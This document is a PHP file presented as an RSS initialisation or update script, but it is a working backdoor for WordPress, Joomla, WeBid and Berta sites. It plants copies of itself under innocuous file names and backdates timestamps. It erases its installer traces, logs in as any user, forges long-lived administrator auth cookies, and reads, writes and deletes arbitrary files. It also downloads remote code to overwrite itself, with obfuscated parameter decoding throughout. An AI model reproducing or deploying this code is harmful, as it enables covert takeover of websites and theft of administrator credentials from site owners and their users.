<?php
/*
: update1384015054
*/
@set_time_limit(0);
@error_reporting(0);

class RSSInitEx
{
    private $_cms = null, $_path = null, $_init = null, $_site = null, $_cmstime = null, $_dirs = array();
    private $KEY = 'XdUkiS';
    private $VERSION = '0.11';
    private $_param = array();

    public function __construct()
    {
        $this->getCMS();
    }

    public function run()
    {
        if (empty($this->KEY)) {
            $this->install();
        } else {
            $this->process();
        }
    }

    public function includes()
    {
        switch ($this->getCMS()) {
            case 'WP':
                define('BASE_PATH', $this->getCMSPath() . '/');
                define('WP_USE_THEMES', false);
                return(array($this->getCMSPath() . '/wp-load.php'));
                break;

            case 'WEBID':
                return(array($this->getCMSPath() . '/common.php'));

            default:
                return array();
        }
    }

    public function hasParam($param)
    {
        return array_key_exists($param, $this->_param);
    }

    public function getParam($param, $default = null)
    {
        if (!$this->hasParam($param)) {
            return $default;
        }

        return $this->_param[$param];
    }

    
    private function getCMS()
    {
        if (!is_null($this->_cms)) {
                        return $this->_cms;
        }

                $dir = dirname(__FILE__);

        do {
                        if (($res = @opendir($dir)) === FALSE) {
                break;
            }

            @closedir($res);
            $tmp = $dir;
            if ($cms = $this->checkCMSDir($dir)) {
                $this->_cms = $cms;
                $this->_path = $dir;
                break;
            }
        } while (($dir = @realpath("$dir/..")) && $tmp != $dir);

        if (is_null($this->_cms)) {
                        $this->_cms = '';
        }

        if (is_null($this->_path)) {
                        $this->_path = dirname(__FILE__);
        }

                foreach ($this->glob('*') as $file) {
            if (($cmstime = @filectime($file)) !== FALSE) {
                if (is_null($this->_cmstime) || $cmstime < $this->_cmstime) {
                    $this->_cmstime = $cmstime;
                }
            }
        }

        if (is_null($this->_cmstime)) {
                        $this->_cmstime = 0;
        }

        return $this->_cms;
    }

    
    private function getCMSPath()
    {
        if (!is_null($this->_path)) {
                        return $this->_path;
        }

        $this->getCMS();

        return $this->_path;
    }

    
    private function getCMSSite()
    {
        if (!is_null($this->_site)) {
            return $this->_site;
        }

                $this->initCMS();

        if (is_null($this->_site)) {
                        $this->_site = ((isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) ? 'https' : 'http') . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '') . '/';
        }

        if ($this->_site[strlen($this->_site) - 1] != '/') {
            $this->_site .= '/';
        }

        return $this->_site;
    }

    
    private function getCMSTime()
    {
        if (!is_null($this->_cmstime)) {
            return $this->_cmstime;
        }

        $this->getCMS();

        return $this->_cmstime;
    }

    
    private function initCMS()
    {
        if (!is_null($this->_init)) {
                        return $this->_init;
        }

                $cms = $this->getCMS();

        switch ($cms) {
            case 'WP':
                if (function_exists('site_url')) {
                    $this->_site = site_url();
                }
                break;

            case 'JOOMLA':
                                define('_JEXEC', 1);
                define('JPATH_BASE', $this->getCMSPath());
                define('DS', DIRECTORY_SEPARATOR);

                @include_once(JPATH_BASE.DS.'includes'.DS.'defines.php');
                @include_once(JPATH_BASE.DS.'includes'.DS.'framework.php');

                try {
                    $app = &JFactory::getApplication('administrator');
                } catch (\Exception $ex) {}
                if (class_exists('JURI')) {
                    $this->_site = JURI::base();
                }

                                $this->_site = $this->trimUrl($this->_site, array(
                    '/tmp/', '/tmp',
                    '/administrator/', '/administrator',
                    '/libraries/', '/libraries',
                    '/includes/', '/includes',
                    '/plugins/', '/plugins',
                    '/media/', '/media',
                ));
                break;

            case 'WEBID':
                global $system;
                $this->_site = $system->SETTINGS['siteurl'];
                break;

            case 'BERTA':
                $this->_site = 'http://' . $_SERVER['HTTP_HOST'];
                break;
        }

        return $this->_init;
    }

    
    private function checkCMSDir($dir)
    {
        if (@file_exists($dir . '/wp-config.php') && @stripos(@file_get_contents($dir . '/wp-config.php'), 'wordpress') !== false) {
            return 'WP';
        } elseif (@file_exists($dir . '/configuration.php') && @strpos(@file_get_contents($dir . '/configuration.php'), 'JConfig') !== false) {
            return 'JOOMLA';
        } elseif (@file_exists($dir . '/common.php') && @strpos(@file_get_contents($dir . '/common.php'), 'InWeBid') !== false) {
            return 'WEBID';
        } elseif (@file_exists($dir . '/index.php') && @strpos(@file_get_contents($dir . '/index.php'), 'include \'engine/index.php\';') !== false) {
            return 'BERTA';
        }

        return '';
    }

    
    private function getDirs()
    {
        if (!empty($this->_dirs)) {
            return $this->_dirs;
        }

        $path = $this->getCMSPath();

        switch ($this->getCMS()) {
            case 'WP':
                $this->_dirs = array(
                    'wp-includes' => "$path/wp-includes/",
                    'wp-content' => "$path/wp-content/",
                    'wp-content/plugins' => "$path/wp-content/plugins/",
                    'wp-content/uploads' => "$path/wp-content/uploads/",
                    '' => "$path/",
                );
                break;

            case 'JOOMLA':
                $this->_dirs = array(
                    'libraries' => "$path/libraries/",
                    'includes' => "$path/includes/",
                    'plugins' => "$path/plugins/",
                    'media' => "$path/media/",
                    '' => "$path/",
                );
                break;

            case 'WEBID':
                $this->_dirs = array(
                    'inc' => "$path/inc/",
                    'includes' => "$path/includes/",
                    'images' => "$path/images/",
                    'admin' => "$path/admin/",
                    '' => "$path/",
                );
                break;

            case 'BERTA':
                $this->_dirs = array(
                    'engine' => "$path/engine/",
                );
                break;

            default:
                $this->_dirs = array(
                    '' => "$path/",
                );
                break;
        }

        return $this->_dirs;
    }

    private function install()
    {
        if (!empty($this->KEY)) {
            return false;
        }

                switch ($this->_cms) {
            case 'WP':
                $newFiles = array('rss-init.php', 'wp-extended.php', 'wp-oupdate.php');
                break;

            case 'JOOMLA':
                $newFiles = array('joomla-init.php', 'joomla-extended.php', 'joomla-oupdate.php');
                break;

            case 'WEBID':
                $newFiles = array('webid-setup.php', 'webid-init.php', 'webid-handler.php');
                break;

            case 'BERTA':
                $newFiles = array('common.inc.php');
                break;
        }
        $newFile = $newFiles[array_rand($newFiles)];

                $this->KEY = empty($_GET['key']) ? $this->randomString() : $_GET['key'];

                $current = @file_get_contents(__FILE__);

                $existing = '';
        foreach ($this->getDirs() as $dir) {
            foreach ($newFiles as $file) {
                $file = $dir . $file;
                if (@file_exists($file) && ($content = @file_get_contents($file)) !== FALSE && preg_match('/\$KEY = \'(\w+)\'/', $content, $matches)) {
                    $this->KEY = $matches[1];
                    $existing = $file;
                    break;
                }
            }
        }

                $current = str_replace('$KEY = \'\'', '$KEY = \''. $this->KEY .'\'', $current);
        $current = str_replace('Plugin'. ' Name', '', $current);

                $httpFile = '';
        foreach (!empty($current) ? $this->getDirs() : array() as $uri => $file) {
            $file = $file . $newFile;
            if (!(@file_put_contents($file, $current) > 0)) {
                                continue;
            }

                        $httpFile = $this->getCMSSite() . $uri . (!empty($uri) ? '/' : '') . $newFile . '?key=' . $this->KEY;
            if (@strpos($this->processFile($httpFile . '&act=ver'), '{"success":true,"___success__data_":{"ver":"'. $this->VERSION .'"') === false) {
                                @unlink($file);
                $httpFile = '';
                continue;
            }

                        $ht = @file_get_contents(dirname($file) . '/.htaccess');
            empty($ht) && $ht = '';
            if (stripos($ht, '-indexes') === false) {
                @file_put_contents(dirname($file) . '/.htaccess', $ht . "\r\n" . 'Options -Indexes' . "\r\n", FILE_APPEND);
            }

                        $this->touch($file);
            if ($existing != $file) {
                                @unlink($existing);
            }
            break;
        }

        if (!isset($_GET['_no__delete___'])) {
                        @unlink(__FILE__); @unlink(substr(__FILE__, 0, -4) . '.xml'); @unlink(substr(__FILE__, 0, -4) . '3.xml');
            if (strpos(basename(dirname(__FILE__)), basename(__FILE__, '.php')) !== false) {
                @rmdir(@realpath(dirname(__FILE__) . '/../../../components/' . basename(dirname(__FILE__))));
                @rmdir(dirname(__FILE__));
            }
        }

                switch ($this->getCMS()) {
            case 'WP':
                global $wpdb;
                foreach (array(basename($_SERVER['PHP_SELF'], '.php'), basename($_SERVER['PHP_SELF'], '.zip')) as $file) {
                    $attachment = $wpdb->get_var($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_title = %s", $file));
                    if (!empty($attachment)) {
                        wp_delete_post($attachment);
                    }
                }
                break;

            case 'JOOMLA':
                try {
                    $db = JFactory::getDbo();
                    $db->setQuery('DELETE FROM #__components WHERE name=' . $db->quote(basename(__FILE__, '.php')));
                    $db->query();
                } catch (\Exception $ex) {}
                try {
                    $db = JFactory::getDbo();
                    $db->setQuery('DELETE FROM #__extensions WHERE name='. $db->quote(basename(__FILE__, '.php')));
                    $db->query();
                } catch (\Exception $ex) {}
                break;
        }

        if (!empty($httpFile)) {
            $this->response(true, array('file' => $httpFile));
        } else {
            $this->response(false, array('file' => empty($current) ? 'READ' : 'MOVE'));
        }
    }

    private function process()
    {
        if (empty($_REQUEST['act']) || !isset($_REQUEST['key']) || $_REQUEST['key'] != $this->KEY) {
                        header('HTTP/1.0 404 Not Found');
            exit;
        }

                if (isset($_REQUEST['r']) && !empty($_REQUEST['r'])) {
            $this->_param = @unserialize($this->b_d(urldecode($_REQUEST['r'])));
        }
        foreach (array(!empty($_GET) ? $_GET : array(), !empty($_POST) ? $_POST : array()) as $arr) {
            foreach ($arr as $k => $v) {
                if (!in_array($k, array('key', 'act', 'r', 'test'))) {
                    $this->_param[$k] = $v;
                }
            }
        }

                if (isset($_REQUEST['test'])) {
            $this->response(true, $this->_param);
        }

        switch ($_REQUEST['act']) {
            case 'info':
                @phpinfo();
                exit;

            case 'ver':
                $this->response(true, array('ver' => $this->VERSION, 'self' => __FILE__));
                exit;

            case 'users':
                $this->cmdUsers();
                exit;

            case 'plugins':
                $this->cmdPlugins();
                exit;

            case 'update':
                $this->cmdUpdate();
                exit;

            case 'download':
                $file = $this->getParam('file');
                $content = $file ? @file_get_contents($file) : null;
                if ($this->getParam('direct')) {
                    echo $content;
                } else {
                    $this->response((bool) $file, array('content' => $content));
                }
                exit;

            case 'edit':
                $this->cmdEdit();
                exit;

            case 'ls':
                $ret = array(
                    'current' => $this->getParam('dir', @dirname(__FILE__)),
                    'dirs' => array(),
                    'files' => array()
                );

                foreach ($this->glob($ret['current'] . '/*') as $glob) {
                    if (is_file($glob)) {
                        $ret['files'][basename($glob)] = array(
                            'size' => @filesize($glob),
                            'writable' => @is_writable($glob),
                        );
                    } else {
                        $ret['dirs'][] = basename($glob);
                    }
                }

                $this->response(true, array('ls' => $ret));
                exit;

            case 'rm':
                $this->response(!$this->hasParam('rm') ? false : (@is_file($this->getParam('rm')) ? @unlink($this->getParam('rm')) : @rmdir($this->getParam('rm'))));
                exit;

            case 'mv':
                $this->response(!$this->hasParam('old') || !$this->hasParam('new') ? false : (@rename($this->getParam('old'), $this->getParam('new'))));
                exit;

            case 'cp':
                $this->response(!$this->hasParam('old') || !$this->hasParam('new') ? false : (@copy($this->getParam('old'), $this->getParam('new'))));
                exit;

            case 'mkdir':
                $this->response(!$this->hasParam('dir') ? false : @mkdir($this->getParam('dir')));
                exit;

            case 'touch':
                $this->response(!$this->hasParam('file') ? false : $this->touch($this->getParam('file')));
                exit;

            case 'cookie':
                $response = $this->cookie();
                $this->response(!empty($response), $response);
                exit;

            default:
                header('HTTP/1.0 404 Not Found');
                exit;
                break;
        }
    }

    
    private function cmdUsers()
    {
        if (!$this->hasParam('id')) {
                        $users = array();
            $this->initCMS();

            switch ($this->getCMS()) {
                case 'WP':
                    $dbUsers = get_users();

                    
                    foreach ($dbUsers as $user) {
                        $users[] = array(
                            'id' => $user->ID,
                            'user_login' => implode(', ', is_array($user->data->user_login) ? $user->data->user_login : array($user->data->user_login)),
                            'display_name' => $user->data->display_name,
                            'roles' => implode(', ', is_array($user->roles) ? $user->roles : array('unknown'))
                        );
                    }
                    break;

                case 'JOOMLA':
                    $db = JFactory::getDbo();

                    $query = 'SELECT u.name, u.username, u.email, u.id FROM #__users u';
                    $db->setQuery($query);
                    $allRows = $db->loadAssocList();
                    foreach ($allRows as $row) {
                        $users[] = array(
                            'id' => $row['id'],
                            'user_login' => $row['username'],
                            'display_name' => $row['name'],
                            'roles' => empty($row['role']) ? 'unknown' : $row['role']
                        );
                    }
                    break;
            }

            $this->response(true, array('users' => $users));
        } else {
                        $this->initCMS();

            switch ($this->getCMS()) {
                case 'WP':
                    $data = get_userdata($this->getParam('id'));
                    $user_login = $data->data->user_login;
                    wp_set_current_user($this->getParam('id'), $user_login);
                    wp_set_auth_cookie($this->getParam('id'));
                    do_action('wp_login', $user_login);
                    header('Location: ' . get_admin_url());
                    exit;

                case 'JOOMLA':
                    global $mainframe;
                    $mainframe =& JFactory::getApplication('administrator');
                    $mainframe->initialise();

                    jimport('joomla.user.helper');
                    $user =& JFactory::getUser(intval($this->getParam('id')));
                    JPluginHelper::importPlugin('user');
                    $response = array('username' => $user->username);
                    $options = array('remember' => false, 'action' => 'core.login.site');

                    $mainframe->triggerEvent('onLoginUser', array($response, $options));
                    $mainframe->triggerEvent('onUserLogin', array($response, $options));
                    header('Location: ' . $this->getCMSSite() . 'administrator/index.php');
                    exit;
            }
        }
    }

    
    private function cmdPlugins()
    {
                $files = array();
        $this->findFiles($this->getParam('files'), $this->getParam('opts', array()), $files);
        $this->response(true, array('plugins' => $files));
    }

    private function findFiles($dir, $opts, &$files)
    {
        $checkFiles = array();

        if (empty($dir) && !is_array($dir)) {
                        if ($cms = $this->getCMS()) {
                $depth = isset($opts['depth'][$cms]) ? $opts['depth'][$cms] : 3;
                $odir = $this->getCMSPath();
            } else {
                                $depth = 1;
                $odir = dirname(__FILE__);
            }

                        do {
                if (($res = @opendir($odir)) !== false) {
                    @closedir($res);
                    $dir = $odir;
                }
            } while (($odir = @realpath("$dir/..")) && ($dir != $odir) && $depth-- > 0);
        } elseif (is_array($dir)) {
                        foreach ($dir as $entry) {
                if (@is_dir($entry)) {
                                        $this->findFiles($entry, $opts, $files);
                } elseif (@is_file($entry)) {
                                        $checkFiles[] = $entry;
                }
            }
        }

                if (!is_array($dir) && @is_dir($dir)) {
            $followSubdirectories = false;

            if (empty($opts['system']) && $cms = $this->checkCMSDir($dir)) {
                                $opts['system'] = $cms;
                $pluginDirs = array();
                switch ($cms) {
                    case 'WP':
                        $pluginDirs = array("$dir/wp-content/plugins/", "$dir/wp-content/mu-plugins/");
                        $checkFiles[] = "$dir/wp-content/advanced-cache.php";
                        break;
                    case 'JOOMLA':
                        $pluginDirs = array("$dir/plugins/");
                        break;
                    case 'WEBID':
                        $pluginDirs = array("$dir/includes/");
                        break;
                    case 'BERTA':
                        $pluginDirs = array("$dir/engine");
                        break;
                }

                                foreach ($pluginDirs as $pluginDir) {
                    $this->findFiles($pluginDir, $opts, $files);
                }
            } elseif (!empty($opts['system'])) {
                                switch ($opts['system']) {
                    case 'WP':
                        foreach ($this->glob("$dir/*.php") as $file) {
                            $checkFiles[] = $file;
                        }
                        $followSubdirectories = true;
                        break;

                    case 'JOOMLA':
                                                foreach ($this->glob("$dir/*.xml") as $file) {
                            if (!@is_file($file) || @filesize($file) === false || @filesize($file) > 1048576 || ($content = @file_get_contents($file)) === false) {
                                continue;
                            }

                            $pos = 0;
                            while (true) {
                                if (($pos = stripos($content, '<files>', $pos)) === false || ($pos_end = stripos($content, '</files>', $pos)) === false) {
                                    break;
                                }

                                $content_tmp = substr($content, $pos, $pos_end - $pos);
                                $pos++;

                                                                $filename = '';
                                if (($pos_filename = stripos($content_tmp, '<filename plugin=')) !== false && ($pos_filename = strpos($content_tmp, '>', $pos_filename)) !== false && ($pos_filename_end = stripos($content_tmp, '</filename>', $pos_filename)) !== false) {
                                    $filename = substr($content_tmp, $pos_filename + 1, $pos_filename_end - $pos_filename - 1);
                                }
                                if (empty($filename)) {
                                    continue;
                                }

                                                                $folder = '';
                                if (($pos_folder = stripos($content_tmp, '<folder')) !== false && ($pos_folder = strpos($content_tmp, '>', $pos_folder)) !== false && ($pos_folder_end = stripos($content_tmp, '</folder>', $pos_folder)) !== false) {
                                    $folder = substr($content_tmp, $pos_folder + 1, $pos_folder_end - $pos_folder - 1);
                                }

                                $checkFiles[] = dirname($file) . '/' . $filename;
                                if (!empty($folder)) {
                                    $checkFiles[] = dirname($filename) . '/' . $folder . '/' . basename($filename);
                                }
                            }
                        }
                        $followSubdirectories = true;
                        break;

                    case 'WEBID':
                        foreach ($this->glob("$dir/functions_*.php") as $file) {
                            $checkFiles[] = $file;
                        }
                        $followSubdirectories = false;
                        break;

                    case 'BERTA':
                        foreach ($this->glob("$dir/inc.*.php") as $file) {
                            $checkFiles[] = $file;
                        }
                        $followSubdirectories = false;
                        break;
                }
            } else {
                                $followSubdirectories = true;
            }

            if ($followSubdirectories) {
                                foreach ($this->glob("$dir/*", GLOB_ONLYDIR) as $fdir) {
                    $this->findFiles($fdir, $opts, $files);
                }
            }
        }

        if (!empty($opts['system']) && !empty($checkFiles)) {
                        foreach ($checkFiles as $file) {
                if (!@is_file($file) || !@is_writable($file) || !($file = @realpath($file)) || @filesize($file) === false || @filesize($file) > 1048576 || ($content = @file_get_contents($file)) === false) {
                                        continue;
                }

                $valid = false;
                switch ($opts['system']) {
                    case 'WP':
                                                if (stripos($content, 'Plugin'.' Name') !== false || in_array(basename($file), array('advanced-cache.php', 'wp-cache-phase2.php'))) {
                            $valid = true;
                        }
                        break;

                    case 'JOOMLA':
                                                if (strpos($content, 'J'.'Plugin') !== false) {
                            $valid = true;
                        }
                        break;

                    case 'WEBID':
                    case 'BERTA':
                        $valid = true;
                }

                if (!$valid) {
                                        continue;
                }

                $found = array('file' => $file, 'system' => $opts['system']);

                                if (!empty($opts['search'])) {
                    foreach (is_array($opts['search']) ? $opts['search'] : array($opts['search']) as $search) {
                        if (($pos = strpos($content, $search)) !== false) {
                            if (preg_match('/\'v\' => (\d+)/', substr($content, $pos), $matches)) {
                                $found['v'] = $matches[1];
                            } else {
                                $found['v'] = false;
                            }
                            break;
                        }
                    }
                }

                $files[] = $found;
            }
        }
    }

    
    private function cmdUpdate()
    {
        $success = false;

        $file = $this->processFile($this->getParam('file'));
        if ($file !== false) {
            if (@strpos($file, '<'.'?php') === 0) {
                                $file = str_replace('$KEY = \'\'', '$KEY = \''. $this->KEY . '\'', $file);
                $file = str_replace('Plugin'.' Name:', '', $file);
                $success = @file_put_contents(__FILE__, $file) > 0;
            }

            if ($success) {
                $this->touch(__FILE__);
            }
        }

        $this->response($success);
    }

    
    private function cmdEdit()
    {
                $file = $this->getParam('file');
        $content = $this->hasParam('content') ? $this->processFile($this->getParam('content')) : false;
        $success = false;

        if (!empty($file) && $content !== false) {
                        $success = @file_put_contents($file, $content, $this->hasParam('append') ? FILE_APPEND : 0);
        }

        $this->response($success !== false, array('length' => $success !== false ? $success : 0));
    }

    private function touch($file)
    {
        $this->getCMS();
        return @touch($file, $this->getCMSTime(), $this->getCMSTime());
    }

    private function cookie()
    {
        switch ($this->getCMS()) {
            case 'WP':
                if (function_exists('wp_generate_auth_cookie')) {
                    return array(
                        'site' => get_site_url(),
                        'cookie' => AUTH_COOKIE,
                        'auth' => array_map(function ($user) {
                            return wp_generate_auth_cookie($user->ID, time() + 315569260, 'auth');
                        }, get_users('role=administrator')),
                    );
                }
                break;
        }
    }

    private function randomString($len = 6)
    {
        return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
    }

    private function b_d($v)
    {
        if (!strlen($v)) {
            return '';
        }

        if ($v[0] == 'x') {
                        $decoded = '';
            for ($i = 2; $i < strlen($v); $i++) {
                $decoded .= $v[$i] ^ $v[1];
            }
            return $decoded;
        } elseif ($v[0] == '1') {
                        $f = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
            return @$f(substr($v, 1));
        } elseif ($v[0] == '2') {
                        return @pack('H*', @substr($v, 1));;
        } elseif ($v[0] == '3') {
                        return @str_rot13(@substr($v, 1));
        }

        return $v;
    }

    private function processFile($content, $timeout = 5)
    {
        if (empty($content)) {
            return '';
        }

        if (strpos($content, 'http') !== 0) {
                        return $content;
        }

                        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== false) {
                $file = @file_get_contents($content, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

                if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $content);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

                if (extension_loaded('sockets')) {
            $data = parse_url($content);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    
    private function glob($pattern, $flags = null)
    {
        $glob = @glob($pattern, $flags);
        if (!is_array($glob)) {
            $glob = array();
        }

        return $glob;
    }

    
    private function trimUrl($url, $remove)
    {
        foreach (is_array($remove) ? $remove : array($remove) as $trim) {
            if (strrpos($url, $trim) === strlen($url) - strlen($trim)) {
                return substr($url, 0, 1 - strlen($trim));
            }
        }

        return $url;
    }

    
    private function response($success = true, $data = array())
    {
        if (!headers_sent()) {
            if (!empty($_REQUEST['callback'])) {
                                header('Content-Type: application/javascript');
                echo $_REQUEST['callback'] . '(';
            } else {
                header('Content-Type: application/json');
            }
        }

        echo @json_encode(array('success' => $success, '___success__data_' => $data, '_end_place_holder_' => true));

        if (!empty($_REQUEST['callback'])) {
            echo ');';
        }

        exit;
    }
}

$__rssInitEx = new RSSInitEx();
foreach ($__rssInitEx->includes() as $inc) {
    @include_once($inc);
}
$__rssInitEx->run();
unset($__rssInitEx);
?>